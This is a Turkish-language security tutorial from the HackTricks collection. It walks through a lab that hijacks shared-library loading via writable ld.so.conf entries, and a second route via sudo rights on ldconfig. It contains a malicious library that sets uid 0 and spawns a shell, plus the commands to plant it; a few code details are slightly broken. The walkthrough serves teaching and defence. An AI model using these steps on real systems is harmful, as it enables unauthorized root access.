# ld.so privesc exploit örneği

{{#include ../../banners/hacktricks-training.md}}

## Ortamı Hazırlama

Aşağıdaki bölümde, ortamı hazırlamak için kullanacağımız dosyaların kodunu bulabilirsiniz.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Bu dosyaları** makinenizde aynı klasörde **oluşturun**
2. **Kütüphaneyi** **derleyin**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so`'yu `/usr/lib`'ye **kopyalayın**: `sudo cp libcustom.so /usr/lib` (root yetkileri)
4. **Çalıştırılabilir dosyayı** **derleyin**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Ortamı kontrol et

_libcustom.so_'nun _/usr/lib_'den **yüklenip** yüklenmediğini ve ikili dosyayı **çalıştırıp** çalıştıramadığınızı kontrol edin.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

Bu senaryoda **birinin _/etc/ld.so.conf/_ içinde savunmasız bir giriş oluşturduğunu** varsayacağız:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
Hassas klasör _/home/ubuntu/lib_ (yazılabilir erişimimizin olduğu yer).\
**Aşağıdaki kodu** o yolun içinde indirin ve derleyin:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
Artık **yanlış yapılandırılmış** yolun içinde kötü niyetli libcustom kütüphanesini **oluşturduğumuza göre**, bir **yeniden başlatma** veya root kullanıcısının **`ldconfig`** komutunu çalıştırmasını beklememiz gerekiyor (_eğer bu ikiliyi **sudo** olarak çalıştırabiliyorsanız veya **suid biti** varsa, kendiniz çalıştırabileceksiniz_).

Bu gerçekleştiğinde, `sharevuln` ikilisinin `libcustom.so` kütüphanesini nereden yüklediğini **yeniden kontrol edin**:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Gördüğünüz gibi, **`/home/ubuntu/lib`'den yüklüyor** ve herhangi bir kullanıcı bunu çalıştırırsa, bir shell çalıştırılacaktır:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!NOTE]
> Bu örnekte ayrıcalıkları yükseltmediğimizi, ancak yürütülen komutları değiştirerek ve **kötü niyetli ikili dosyayı çalıştırması için root veya başka bir ayrıcalıklı kullanıcıyı bekleyerek** ayrıcalıkları yükseltebileceğimizi unutmayın.

### Diğer yanlış yapılandırmalar - Aynı zafiyet

Önceki örnekte, bir yöneticinin **`/etc/ld.so.conf.d/` içindeki bir yapılandırma dosyasına ayrıcalıksız bir klasör ayarladığı** bir yanlış yapılandırmayı taklit ettik.\
Ancak, `/etc/ld.so.conf.d` içindeki bazı **yapılandırma dosyalarında**, `/etc/ld.so.conf.d` klasöründe veya `/etc/ld.so.conf` dosyasında **yazma izinleriniz** varsa, aynı zafiyeti yapılandırabilir ve bunu istismar edebilirsiniz.

## İstismar 2

**`ldconfig` üzerinde sudo ayrıcalıklarınız olduğunu varsayalım**.\
`ldconfig`'e **konfigürasyon dosyalarının nereden yükleneceğini** belirtebilirsiniz, böylece `ldconfig`'in keyfi klasörleri yüklemesinden faydalanabiliriz.\
Şimdi, "/tmp" yüklemek için gereken dosyaları ve klasörleri oluşturalım:
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Şimdi, **önceki istismarda belirtildiği gibi**, **kötü niyetli kütüphaneyi `/tmp` içinde oluşturun**.\
Ve sonunda, yolu yükleyelim ve kütüphanenin nereden yüklendiğini kontrol edelim:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Gördüğünüz gibi, `ldconfig` üzerinde sudo ayrıcalıklarına sahip olmak aynı zafiyeti istismar etmenizi sağlar.** 

{{#include ../../banners/hacktricks-training.md}}
